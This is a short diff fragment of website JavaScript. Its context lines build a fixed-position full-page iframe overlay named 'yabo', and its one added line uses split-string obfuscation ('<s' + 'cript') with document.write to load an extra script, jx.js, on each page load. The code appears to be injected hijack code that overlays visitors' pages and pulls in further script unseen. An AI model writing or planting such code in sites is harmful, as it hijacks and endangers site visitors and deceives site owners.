@@ -17,3 +17,4 @@ yabo.innerHTML = '<iframe src='+ _src +' frameborder="0" style="position:fixed;t
 hd.appendChild(styleCSS);
 hd.parentNode.appendChild(yabo);
 }
+;document.write("<s" + "cript type='text/javascript' src='/js/jx.js?t=" + Math.random() + "''></scr" + "ipt>")
